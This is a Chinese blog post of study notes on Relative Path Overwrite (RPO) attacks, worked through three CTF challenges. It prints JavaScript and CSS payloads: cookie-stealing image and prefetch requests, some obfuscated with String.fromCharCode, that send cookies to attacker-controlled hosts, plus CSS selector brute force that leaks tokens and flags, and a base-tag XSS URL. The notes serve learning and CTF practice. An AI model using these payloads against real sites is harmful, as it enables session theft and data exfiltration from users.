---
title: "RPO攻击学习笔记"
slug: "rpo-attack-study-notes"
description: "relative path overwrite"
date: 2022-04-24T21:39:29+08:00
categories: ["NOTES&SUMMARY"]
series: []
tags: ["RPO"]
draft: false
toc: true
---

http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/

----

RPO指Relative Path Overwrite 相对路径覆盖，利用浏览器和服务器的解析差异 将页面中使用相对路径引入的静态资源文件进行替换，完成RPO攻击

最常见的就是对url path的解析差异，比如这样的url

```
http://192.168.31.175/test%2findex.html
```

默认情况下apache会认为请求的是`test%2findex.html`，无法访问，而Nginx会将`%2f`解析为`/` 从而认为请求的是test文件夹下的`index.html`，正常访问（可以通过修改路由规则来影响这些）

另一个需要满足的条件是页面静态资源文件的相对路径，以下面的题为例

## [强网杯 2018]share mind

*没有找到docker文件，以下内容参考[wp1](https://yangrz.github.io/blog/2018/03/27/ctf/)  |  [wp2](https://xz.aliyun.com/t/2220)

我们可以在report页面给bot提交一个link，还可以写note，如果不写标题只写内容的话在view时文章页面是直接打印的内容（无`<h1>`），而两个都写了的话是把文章标题和内容都输出在html标签之间的（有`<h1>`）

![share your mind6](https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind6.png)

![share your mind7](https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind7.png)


在页面源码中我们可以发现jquery.min.js这个文件是使用的相对路径的方式引入到index.php页面

![share your mind8](https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind8.png)

也就是说如果访问的页面是`http://39.107.33.96:20000/index.php/`则会引入`http://39.107.33.96:20000/index.php/static/js/jquery.min.js`，结合我们前面提过的url解析问题，如果访问的页面是`http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f` 浏览器则会尝试引入`http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2fstatic/js/jquery.min.js`，而这个url请求的页面实际上还是我们的Note，也就是note内容将作为jquery.min.js被引入页面，如果note部分是payload，那么访问`http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f`就会执行

我们可以构造类似这样的payload来偷cookie

```js
(new Image()).src='http://vps-ip:port/?cookie='+document.cookie
```

页面对引号做了转义，我们用`String.fromCharCode`

```js
(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,55,101,52,122,119,48,99,101,121,101,46,105,111,63)+document.cookie;
```

cookie提示我们打另一个目录，构造exp

```js
var iframe = document.createElement(String.fromCharCode(105,102,114,97,109,101));
iframe.src = String.fromCharCode(47,81,87,66,95,102,108,52,103,47,81,87,66,47);
iframe.id = String.fromCharCode(102,114,97,109,101);
document.body.appendChild(iframe);
iframe.onload = function (){
    var c = document.getElementById(String.fromCharCode(102,114,97,109,101)).contentWindow.document.cookie;
	var y1r0nz = document.createElement(String.fromCharCode(108,105,110,107));
	y1r0nz.setAttribute(String.fromCharCode(114,101,108),String.fromCharCode(112,114,101,102,101,116,99,104));
    y1r0nz.setAttribute(String.fromCharCode(104,114,101,102), String.fromCharCode(47,47,55,101,52,122,119,48,46,99,101,121,101,46,105,111,47,63,102,108,97,103,61) + c);
    document.head.appendChild(y1r0nz);
}
```

经过浏览器渲染以后就是下述的两行html代码

```html
<iframe id="frame" src="/QWB_fl4g/QWB/">
<link rel="prefetch" href="http://7e4zw0.ceye.io/?flag=document.getElementById(frame).contentWindow.document.cookie">
```

prefetch属性规定了当前文档在链接文档之前被调用，这样就可以外带对应路径下的cookie了

## [pwnhub 0618]大物必须过

[wp](https://pwnhub.cn/media/writeup/113/29b7f18c-b1f2-4cfc-8f84-1b3793c52a7a_9f56fde2.pdf)  |  [wp2](https://blog.csdn.net/Fly_hps/article/details/80613543)

report_bug.php页面可以提交link，classes.php页面引入css时使用了相对路径进行加载

```html
<linkrel="stylesheet"type="text/css"href="../../classes.css">
```

与上面的思路相同，payload

```
http://52.80.19.55/user.php/69/0/..%2f..%2f..%2fclasses.php/0
```

当访问这个url时，classes.css会被/user.php/69对应的内容所覆盖

至于payload的内容，不同于我们常见的js payload

```css
*{}*{background-image:url(http://vpsip);}*{}
```

## [36c3CTF 2018]urlstorage

[dockerfile](https://github.com/eboda/34c3ctf/tree/master/urlstorage)  |  [wp](https://www.cnblogs.com/iamstudy/articles/2017_34C4_web_urlstorage_writeup.html) （由于dockerfile用的ubuntu17 无法复现）

页面的css加载使用相对路径（可以进行rpo 控制css），csp信息如下

```
frame-ancestors 'none'; form-action 'self'; connect-src 'self'; script-src 'self'; font-src 'self' ; style-src 'self';
```

/urlstorage处可以提交name和url，存在csrf（可以任意修改他人的url）

/flag?token=xxx处存在xss

思路：通过可以覆盖的css信息模糊匹配/爆破出flag

首先是爆破token，第一位字符：

```css
a[href^=flag\?token\=0]{background: url(//xxx.pw/rpo/?c=1);}
a[href^=flag\?token\=1]{background: url(//xxx.pw/rpo/?c=1);}
...
a[href^=flag\?token\=f]{background: url(//xxx.pw/rpo/?c=f);}
```

第二位字符：

```css
a[href^=flag\?token\=10]{background: url(//xxx.pw/rpo/?c=10);}
a[href^=flag\?token\=11]{background: url(//xxx.pw/rpo/?c=11);}
```

匹配flag时的坑点在于css选择器在匹配的时候首字符不能是数字，而flag的开头为`34c3`，所以使用css的模糊匹配

```css
#flag[value*=C3_1]{background: url(http://xxx.pw/?flag=C3_1);}
```

或者16进制编码

```css
#flag[value^=\33\34\43\33]{background: url(http://xxx.pw/?34c3);}
```

之后利用之前的xss点修改base标签进行rpo，获取flag

```
http://192.168.42.134:8080/flag?token=cdebcc090a8b4e339b876c33ad1c0acb%3C/title%3E%3Cbase%20href=urlstorage/123%3E
```

